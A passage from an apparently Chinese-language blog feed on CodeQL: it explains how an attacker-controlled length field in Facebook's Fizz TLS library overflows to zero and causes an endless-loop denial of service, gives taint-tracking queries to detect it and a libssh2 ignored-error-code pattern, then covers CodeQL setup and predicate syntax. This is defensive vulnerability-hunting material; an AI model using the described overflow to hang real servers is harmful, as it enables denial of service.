从当前cursor指向的位置中，读取一个uint16_t</span></span><br><span class="line">            <span class="keyword">auto</span> length = cursor.readBE&lt;<span class="keyword">uint16_t</span>&gt;();</span><br><span class="line">            <span class="comment">// 检查是否接收到足够多的数据以继续解析</span></span><br><span class="line">            <span class="keyword">if</span> (buf.chainLength() &lt; (cursor - buf.front()) + length) &#123;</span><br><span class="line">              <span class="keyword">return</span> folly::none;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// !!! 将 length执行加法操作</span></span><br><span class="line">            length +=</span><br><span class="line">                <span class="keyword">sizeof</span>(ContentType) + <span class="keyword">sizeof</span>(ProtocolVersion) + <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>);</span><br><span class="line">            <span class="comment">// 修改buf的指针，使得下一次获取cursor时的位置移至后面</span></span><br><span class="line">            <span class="comment">// 详细函数见最下方</span></span><br><span class="line">            buf.trimStart(length);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IOBuf::trimStart</span><span class="params">(<span class="built_in">std</span>::<span class="keyword">size_t</span> amount)</span> </span>&#123;</span><br><span class="line">    DCHECK_LE(amount, length_);</span><br><span class="line">    data_ += amount;</span><br><span class="line">    length_ -= amount;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这段代码中将会从传入的网络数据包中读取一个<code>uint16_t</code>，并将其传给<code>length</code>。<strong>即<code>length</code>是攻击者可控的</strong>。同时，代码中的<code>if</code>语句只是用于检测是否接收到足够多的数据，并<strong>不会检测可能存在的溢出操作</strong>。</p>
</li>
<li>
<p>因此，倘若<code>length</code>在执行<code>+=</code>操作时溢出至0，那么在执行<code>buf.trimStart</code>函数时，<code>buf</code>中指向当前正在处理数据的<strong>指针将不会被修改</strong>。也就是说，在循环的下一次执行中，cursor会被<strong>设置为与当前循环相同的cursor</strong>，然后读取<strong>与当前循环相同的length</strong>，之后length<strong>继续溢出至0</strong>，buf的指针<strong>仍然没有被修改</strong>。如此循环往复，程序将陷入循环中<strong>无法跳出</strong>，这样便造成了拒绝服务攻击（DoS）。</p>
</li>
</ul>
<h3 id="2-QL的编写-2">2. QL的编写</h3>
<ul>
<li>
<p>先列出这个漏洞的必要条件</p>
<ul>
<li>不受信任的输入</li>
<li>向下的类型转换</li>
</ul>
</li>
<li>
<p>首先，我们需要确定一个不受信任的输入。在Fizz中，数据通常按照<strong>网络字节顺序</strong>来通过套接字发送，因此网络字节顺序通常需要转换为<strong>主机字节顺序</strong>，这就意味着<code>ntohs</code>和<code>ntohl</code>通常是<strong>不受信任输入的来源之一</strong>。但是，Fizz使用<code>Endian</code>类来处理字节顺序转换。因此在查询时就必须设置数据流源头为<code>Endian</code>类变量。</p>
<p>以下是一个用于查找所有<code>Endian::big</code>函数声明的QL代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.ir.IR</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The endianness conversion function `Endian::big()`.</span></span><br><span class="line"><span class="comment"> * It is Folly's replacement for `ntohs` and `ntohl`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EndianConvert</span> <span class="title">extends</span> <span class="title">Function</span> &#123;</span></span><br><span class="line">    EndianConvert() &#123;</span><br><span class="line">      <span class="keyword">this</span>.getName() = <span class="string">"big"</span> <span class="keyword">and</span></span><br><span class="line">      <span class="keyword">this</span>.getDeclaringType().getName().matches(<span class="string">"Endian"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from EndianConvert ec</span><br><span class="line">select ec</span><br></pre></td></tr></table></figure>
<p>因此我们可以查找出调用<code>Endian::big</code>函数的<code>FunctionCall</code>，不受信任的数据将从这个<code>FunctionCall</code>中流出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Holds if `i` is an endianness conversion.</span></span><br><span class="line"><span class="comment"> * (A telltale sign of network data.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">isNetworkData</span><span class="params">(Instruction i)</span> </span>&#123;</span><br><span class="line">    i.(CallInstruction).getCallTarget().(FunctionInstruction).getFunctionSymbol() </span><br><span class="line">        instanceof EndianConvert</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后，我们查找从较大类型到较小类型的所有转换，这些类型转换<strong>可能会产生溢出</strong>，而我们的目标就是为了让<strong>不受信任的数据流动至此处</strong>。</p>
<blockquote>
<p><code>ConvertInstruction</code>类型来自于<code>semmle.code.cpp.ir.IR</code>，这个类型将会查找所有的类型转换。</p>
<p>这里的类型转换<strong>不局限于</strong>强制类型转换和隐式类型转换，还包括<code>if</code>条件框中的<code>int</code>转<code>bool</code>类型等等。</p>
<p>所包含的数据量及其之多，因此需要进行二次过滤。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.ir.IR</span><br><span class="line"></span><br><span class="line">from </span><br><span class="line">    ConvertInstruction conv, </span><br><span class="line">    Type inputType, </span><br><span class="line">    Type outputType</span><br><span class="line">where </span><br><span class="line">    <span class="comment">/* 转换后的类型位数必须小于原始类型 */</span></span><br><span class="line">    conv.getResultSize() &lt; conv.getUnary().getResultSize() <span class="keyword">and</span></span><br><span class="line">    <span class="comment">/* 获取初始类型 */</span></span><br><span class="line">    inputType = conv.getUnary().getResultType() <span class="keyword">and</span> </span><br><span class="line">    <span class="comment">/* 获取转换后类型 */</span></span><br><span class="line">    outputType = conv.getResultType()</span><br><span class="line">select</span><br><span class="line">    conv, </span><br><span class="line">    <span class="string">"Narrowing conversion from "</span> + inputType + <span class="string">" to "</span> + outputType + <span class="string">"."</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>接下来，我们便可以编写全局污点追踪查询</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cfg</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">    Cfg() &#123; <span class="keyword">this</span> = <span class="string">"FizzOverflowIR"</span> &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Holds if `source` is network data.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123; </span><br><span class="line">        isNetworkData(source.asInstruction()) </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/** Holds if `sink` is a narrowing conversion. */</span></span><br><span class="line">    <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123; </span><br><span class="line">        isNarrowingConversion(sink.asInstruction()) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将上面的代码组装起来，便是以下的完整代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name Fizz Overflow</span></span><br><span class="line"><span class="comment"> * @description Narrowing conversions on untrusted data could enable</span></span><br><span class="line"><span class="comment"> *              an attacker to trigger an integer overflow.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.ir.dataflow.TaintTracking</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.ir.IR</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The endianness conversion function `Endian::big()`.</span></span><br><span class="line"><span class="comment"> * It is Folly's replacement for `ntohs` and `ntohl`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EndianConvert</span> <span class="title">extends</span> <span class="title">Function</span> &#123;</span></span><br><span class="line">    EndianConvert() &#123;</span><br><span class="line">      <span class="keyword">this</span>.getName() = <span class="string">"big"</span> <span class="keyword">and</span></span><br><span class="line">      <span class="keyword">this</span>.getDeclaringType().getName().matches(<span class="string">"Endian"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Holds if `i` is a narrowing conversion. */</span></span><br><span class="line">predicate isNarrowingConversion(ConvertInstruction i) &#123;</span><br><span class="line">    i.getResultSize() &lt; i.getUnary().getResultSize()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Holds if `i` is an endianness conversion.</span></span><br><span class="line"><span class="comment"> * (A telltale sign of network data.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">predicate isNetworkData(Instruction i) &#123;</span><br><span class="line">    i.(CallInstruction).getCallTarget().(FunctionInstruction).getFunctionSymbol() </span><br><span class="line">        instanceof EndianConvert</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Cfg extends TaintTracking::Configuration &#123;</span><br><span class="line">    Cfg() &#123; <span class="keyword">this</span> = <span class="string">"FizzOverflowIR"</span> &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Holds if `source` is network data.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123; </span><br><span class="line">        isNetworkData(source.asInstruction()) </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/** Holds if `sink` is a narrowing conversion. */</span></span><br><span class="line">    <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123; </span><br><span class="line">        isNarrowingConversion(sink.asInstruction()) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from</span><br><span class="line">  Cfg cfg, DataFlow::PathNode source, DataFlow::PathNode sink, ConvertInstruction conv,</span><br><span class="line">  Type inputType, Type outputType</span><br><span class="line">where</span><br><span class="line">  cfg.hasFlowPath(source, sink) <span class="keyword">and</span></span><br><span class="line">  conv = sink.getNode().asInstruction() <span class="keyword">and</span></span><br><span class="line">  inputType = conv.getUnary().getResultType() <span class="keyword">and</span></span><br><span class="line">  outputType = conv.getResultType()</span><br><span class="line">select sink, source, sink,</span><br><span class="line">  <span class="string">"Conversion of untrusted data from "</span> + inputType + <span class="string">" to "</span> + outputType + <span class="string">"."</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="四、libssh2-eating-error-codes">四、libssh2_eating_error_codes</h2>
<h3 id="1-漏洞模式-3">1. 漏洞模式</h3>
<ul>
<li>
<p>这种漏洞模式主要是由类似于以下的代码组成</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _libssh2_get_c_string(...)&#123; <span class="comment">/* ... */</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_len;</span><br><span class="line"><span class="keyword">if</span>((p_len = _libssh2_get_c_string(&amp;buf, &amp;p)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>_libssh2_get_c_string</code>函数返回的是一个<strong>带符号的整型</strong>，但接收返回值的变量是<strong>无符号</strong>的。因此该漏洞将会使函数内部<strong>产生的error code（-1）被忽略</strong>。</p>
</li>
</ul>
<h3 id="2-QL的编写-3">2. QL的编写</h3>
<ul>
<li>
<p>首先，我们不使用污点分析技术来尝试查询到这些错误。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall call, ReturnStmt ret</span><br><span class="line">where</span><br><span class="line">  <span class="comment">/* 返回语句的返回值限定在负数 */</span></span><br><span class="line">  ret.getExpr().getValue().toInt() &lt; <span class="number">0</span> <span class="keyword">and</span></span><br><span class="line">  <span class="comment">/* 查找一个函数调用，这个函数调用将会调用 那些可能会返回-1的函数 */</span></span><br><span class="line">  call.getTarget() = ret.getEnclosingFunction() <span class="keyword">and</span></span><br><span class="line">  <span class="comment">/* 限定函数调用的返回值被类型转换为无符号整数 */</span></span><br><span class="line">  call.getFullyConverted().getType().getUnderlyingType().(IntegralType).isUnsigned()</span><br><span class="line">select call, ret</span><br></pre></td></tr></table></figure>
<p>可以查询出一部分错误点。</p>
</li>
<li>
<p>但上面的查询代码并不能很好的找到下面这种类型的错误</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> r = f();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> x = r;</span><br></pre></td></tr></table></figure>
<p>因此我们要试着使用一下数据流分析技术，查询从<code>FunctionCall</code>流出的数据（即返回值）到最近一个无符号类型转换的路径。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from FunctionCall call, ReturnStmt ret, DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where</span><br><span class="line">  ret.getExpr().getValue().toInt() &lt; <span class="number">0</span> <span class="keyword">and</span></span><br><span class="line">  call.getTarget() = ret.getEnclosingFunction() <span class="keyword">and</span></span><br><span class="line">  <span class="comment">/* 数据流源头被设置为FunctionCall位置 */</span></span><br><span class="line">  source.asExpr() = call <span class="keyword">and</span> </span><br><span class="line">  <span class="comment">/* 数据流终点被设置为存在类型转换的位置 */</span></span><br><span class="line">  sink.asExpr().getFullyConverted().getType().getUnderlyingType().(IntegralType).isUnsigned() <span class="keyword">and</span></span><br><span class="line">  DataFlow::localFlow(source, sink)</span><br><span class="line">select source, sink</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL初入</title>
    <url>/2020/12/CodeQL-setup/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>CodeQL 是一个语义代码分析引擎，它可以扫描发现代码库中的漏洞。使用 CodeQL，可以像对待数据一样查询代码。编写查询条件以查找漏洞的所有变体并处理，同时可以分享个人查询条件。</p>
<a id="more"></a>
<p>编写该文章时，主要参考了官方文档 - <a href="https://help.semmle.com/QL/ql-handbook/index.html#" target="_blank" rel="noopener">QL language reference</a></p>
<h2 id="二、环境搭建">二、环境搭建</h2>
<blockquote>
<p>环境搭建整体参考 <a href="https://paper.seebug.org/1078/" target="_blank" rel="noopener">代码分析引擎 CodeQL 初体验</a></p>
</blockquote>
<ul>
<li>
<p>首先，下载一下<code>CodeQL CLI</code>二进制文件并安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载codeql.zip</span></span><br><span class="line">wget https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">unzip codeql.zip</span><br><span class="line"><span class="comment"># 将codeql添加至path中</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"export PATH=\$PATH:/usr/class/codeql"</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于是入门，我们只需要使用初始工作区（starter workspace）就好，因此执行以下命令</p>
<blockquote>
<p>工作区配置参考——<a href="https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html#using-the-starter-workspace" target="_blank" rel="noopener">Using the starter workspace</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive git@github.com:github/vscode-codeql-starter.git</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：该工作区内含了QL库，因此一定要使用递归方式来下拉工作区代码。</p>
<p>递归方式下拉该仓库后，我们不需要再下拉<code>https://github.com/Semmle/ql</code>这个库了。</p>
</blockquote>
<p>如果觉得下拉很慢，可以挂个代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置代理</span></span><br><span class="line">git config --global http.proxy &lt;Protocol&gt;://&lt;IP&gt;:&lt;PORT&gt;</span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后，我们还需要在VScode中下载CodeQL的插件——<a href="https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql" target="_blank" rel="noopener">Visual Studio Code Marketplace</a>。</p>
<p>插件下载完成后，还需要在vscode中设置一下<code>Code QL -- Cli: Executable Path</code>为刚刚下载下来的<code>codeql</code>二进制文件执行路径。</p>
</li>
<li>
<p>上述操作完成后，我们需要先建立一个AST数据库，后续的查询操作等都是在该数据库中完成。</p>
<p>以C++代码为例，我们可以使用如下命令来建立一个数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql database create &lt;database-folder&gt; --language=cpp --<span class="built_in">command</span>=&lt;prefix <span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果省略<code>--command</code>参数，则codeQL会自动检测并使用自己的工具来构建。</p>
<p>但还是强烈推荐使用自己自定义的参数，尤其是大项目时。</p>
</blockquote>
<p>以构建chrome为例，由于chrome项目过于庞大，因此我们只能针对某个模块来进行分析。</p>
<p>于是我们可以进行如下操作</p>
<ul>
<li>
<p>先完整编译一个chromium，release不带符号即可。</p>
</li>
<li>
<p>进入obj目录，将目标模块的obj删除。</p>
</li>
<li>
<p>执行以下命令，重新编译该模块并构建数据库即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gn gen out/ql &amp;&amp; codeql database create &lt;targetFolder&gt; --language=cpp --Command=<span class="string">' ninja -C out/ql chrome'</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>建立好的数据库，其目录结构为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- log\                # 输出的日志信息</span><br><span class="line">- db-cpp\             # 编译的数据库</span><br><span class="line">- src.zip             # 编译所对应的目标源码</span><br><span class="line">- codeql-database.yml # 数据库相关配置</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后在VSCode中，</p>
<ul>
<li>点击“打开工作区”来打开刚刚下拉的<code>vscode-codeql-starter</code>工作区</li>
<li>在CodeQL插件里，打开刚刚生成的database</li>
<li>之后编写自己的CodeQL脚本，并将脚本保存至<code>vscode-codeql-starter\codeql-custom-queries-cpp</code>处，这样import模块时就可以正常引用。</li>
<li>将编写的ql脚本在VSCode中打开，之后点击CodeQL插件中的<code>Run on queue</code>，即可开始查询。</li>
</ul>
</li>
<li>
<p>如果想查看某个文件的AST，直接对目标源码，点击右键—<code>CodeQL: View AST</code>即可。第一次执行时会比较慢，稍微等待十分钟左右即可。</p>
</li>
</ul>
<blockquote>
<p>CodeQL使用操作参考 - <a href="https://help.semmle.com/codeql/codeql-for-vscode/procedures/using-extension.html" target="_blank" rel="noopener">CodeQL分析项目</a></p>
</blockquote>
<h2 id="三、基本语法">三、基本语法</h2>
<blockquote>
<p>基础语法将结合ql代码来讲解。</p>
</blockquote>
<ul>
<li>
<p>该QL将输出所有基础块中的空基础块。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 首先是引入QL库中的一个包</span></span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="comment">// 限定范围在所有的BlockStmt，即所有的基础块</span></span><br><span class="line">from BlockStmt b</span><br><span class="line"><span class="comment">// 获取在当前基础块中，语句个数为0的基础块（即空基础块）</span></span><br><span class="line">where b.getNumStmt() = <span class="number">0</span></span><br><span class="line"><span class="comment">// 输出搜索到的空基础块，与其后面的字符串</span></span><br><span class="line">select b, <span class="string">"This is an empty block."</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下是获取某个宏定义位置的ql代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from Macro m</span><br><span class="line">where m.getName() = <span class="string">"_LIBCPP_NO_CFI"</span></span><br><span class="line">  <span class="keyword">or</span> m.getName() = <span class="string">"_GLIBC_LIKELY"</span></span><br><span class="line">select m,<span class="string">"macro"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>该代码获取调用特定函数的代码位置</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() = <span class="string">"memcpy"</span></span><br><span class="line">select f, <span class="string">"a function named memcpy"</span></span><br></pre></td></tr></table></figure>
<p>这并不稀奇，但关键是下一个ql代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall call, Function func</span><br><span class="line">where</span><br><span class="line">    call.getTarget() = func <span class="keyword">and</span></span><br><span class="line">    func.getName() = <span class="string">"memcpy"</span></span><br><span class="line">select call,<span class="string">"func named memcpy and called"</span></span><br></pre></td></tr></table></figure>
<p><code>FunctionCall</code>将会涵盖所有的函数调用，因此我们可以通过该对象来获取特定函数被调用的位置。</p>
</li>
</ul>
<blockquote>
<p>对于所有的类和函数，都可以通过ctrl+右键的形式来查看其源码来了解更多信息。</p>
</blockquote>
<h2 id="四、高级语法">四、高级语法</h2>
<h3 id="1-谓词">1. 谓词</h3>
<h4 id="a-概述">a. 概述</h4>
<ul>
<li>
<p>在CodeQL中，函数并不叫“函数”，叫做<code>Predicates</code>（谓词）。为了便于说明，下文中笔者可能会混用<strong>函数</strong>这个词语，即下文中的 <strong>“函数”</strong> 与 <strong>“谓语”</strong> 都是指代同一个内容。</p>
</li>
<li>
<p>在使用谓词前，我们需要定义一个谓词。谓词的格式如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">name</span><span class="params">(type arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义谓词有三个步骤</p>
<ul>
<li>关键词predicate（如果没有返回值），或者结果的类型（如果当前谓词内存在返回值）</li>
<li>谓词的名称</li>
<li>谓词的参数列表</li>
<li>谓词主体</li>
</ul>
</li>
</ul>
<h4 id="b-无返回值的谓词">b. 无返回值的谓词</h4>
<ul>
<li>
<p>无返回值的谓词以<code>predicate</code>关键词开头。若传入的值满足谓词主体中的逻辑，则该谓词将保留该值。</p>
</li>
<li>
<p>无返回值谓词的使用范围较小，但仍然在某些情况下扮演了很重要的一个角色，具体功能将在下文中逐渐讲解。</p>
</li>
<li>
<p>需要注意的是，参数<code>i</code>是一个<strong>数据集合</strong></p>
</li>
<li>
<p>举一个简单的例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">isSmall</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">  i in [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from <span class="keyword">int</span> i </span><br><span class="line"><span class="function">where <span class="title">isSmall</span><span class="params">(i)</span> <span class="comment">// 将整数集合i从正无穷大的数据集含，限制至1-9</span></span></span><br><span class="line"><span class="function">select i</span></span><br><span class="line"><span class="function"><span class="comment">// 输出 1-9的数字</span></span></span><br></pre></td></tr></table></figure>
<p>若传入的<code>i</code>是小于10的正整数，则<code>isSmall(i)</code>将会使得传入的集合<code>i</code>只保留符合条件的值，其他值将会被舍弃。</p>
</li>
</ul>
<h4 id="c-带返回值的谓词">c. 带返回值的谓词</h4>
<ul>
<li>
<p>当我们需要将某些结果从谓词中返回时，与C/C++的return语句不同的是，谓词使用的是一个特殊变量<code>result</code>。</p>
</li>
<li>
<p>举个简单例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getSuccessor</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 若传入的i位于1-9内，则返回i+1</span></span><br><span class="line">  <span class="comment">// 注意这个语法不能用C++语法来理解</span></span><br><span class="line">  result = i + <span class="number">1</span> <span class="keyword">and</span> i in [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">select getSuccessor(<span class="number">3</span>)  <span class="comment">// 输出4</span></span><br><span class="line">select getSuccessor(<span class="number">33</span>) <span class="comment">// 不输出任何信息</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>谓词主体的语法只是为了表述逻辑之间的关系，因此务必不要用一般编程语言的语法来理解。</p>
</blockquote>
</li>
<li>
<p>在谓词主体中，<code>result</code>变量可以像一般变量一样正常使用，唯一不同的是这个变量内的数据将会被返回。</p>
<p>同时，<strong>谓词可能返回多个结果，或者根本不返回任何结果</strong>。以下是一个简单的例子。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getANeighbor</span><span class="params">(<span class="built_in">string</span> country)</span> </span>&#123;</span><br><span class="line">    country = <span class="string">"France"</span> <span class="keyword">and</span> result = <span class="string">"Belgium"</span></span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country = <span class="string">"France"</span> <span class="keyword">and</span> result = <span class="string">"Germany"</span></span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country = <span class="string">"Germany"</span> <span class="keyword">and</span> result = <span class="string">"Austria"</span></span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country = <span class="string">"Germany"</span> <span class="keyword">and</span> result = <span class="string">"Belgium"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select getANeighbor(<span class="string">"France"</span>)</span><br><span class="line"><span class="comment">// 返回两个条目，"Belgium"与"Germany"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>谓词不允许描述的数据集合个数<strong>不限于有限数量大小</strong>的。举个例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 该谓词将使得编译报错</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiplyBy4</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// i是一个数据集合，此时该集合可能是**无限大小**</span></span><br><span class="line">  <span class="comment">// result集合被设置为i*4，意味着result集合的大小有可能也是**无限大小**</span></span><br><span class="line">  result = i * <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但如果我们仍然需要定义这类函数，则必须<strong>限制集合数据大小</strong>，同时添加一个<code>bindingset</code>标注。该标注将会声明谓词<code>plusOne</code>所包含的数据集合是有限的，前提是<code>i</code>绑定到有限数量的数据集合。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bindingset[x] bindingset[y]</span><br><span class="line"><span class="function">predicate <span class="title">plusOne</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  x + <span class="number">1</span> = y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from <span class="keyword">int</span> x, <span class="keyword">int</span> y</span><br><span class="line">where y = <span class="number">42</span> <span class="keyword">and</span> plusOne(x, y)</span><br><span class="line">select x, y</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="d-递归">d. 递归</h4>
<ul>
<li>
<p>谓词类似于函数，可以<strong>递归调用</strong>。</p>
<p>同时<code>result</code>变量可以按照任何方式来表达与其他变量之间的关系，因此<code>result</code>变量的赋值不局限于使用<code>=</code>符号。</p>
<p>以下是一个简单例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getANeighbor</span><span class="params">(<span class="built_in">string</span> country)</span> </span>&#123;</span><br><span class="line">  country = <span class="string">"France"</span> <span class="keyword">and</span> result = <span class="string">"Belgium"</span></span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  country = <span class="string">"France"</span> <span class="keyword">and</span> result = <span class="string">"Germany"</span></span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  country = <span class="string">"Germany"</span> <span class="keyword">and</span> result = <span class="string">"Austria"</span></span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  country = <span class="string">"Germany"</span> <span class="keyword">and</span> result = <span class="string">"Belgium"</span></span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  country = getANeighbor(result)</span><br><span class="line">&#125;</span><br><span class="line">select getANeighbor(<span class="string">"Austria"</span>)</span><br><span class="line"><span class="comment">// 输出Germany</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>传递闭包</p>
<blockquote>
